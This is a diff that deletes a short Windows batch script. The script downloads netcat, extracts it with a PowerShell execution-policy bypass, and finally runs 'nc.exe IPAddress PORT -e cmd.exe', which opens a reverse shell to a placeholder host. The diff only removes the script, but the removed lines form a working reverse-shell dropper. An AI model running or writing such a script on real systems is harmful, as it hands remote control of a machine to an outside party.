@@ -1,7 +1,0 @@
-@echo off
-set CurrentDir=%CD%
-curl -L -o "%CurrentDir%\netcat.zip" https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip || exit /b 1
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%CurrentDir%\netcat.zip' -DestinationPath '%CurrentDir%\netcat' -Force" || exit /b 1
-move /y "%CurrentDir%\netcat\nc.exe" "%CurrentDir%\nc.exe" || exit /b 1
-del "%CurrentDir%\netcat.zip" && rd /s /q "%CurrentDir%\netcat"
-nc.exe IPAddress PORT -e cmd.exe
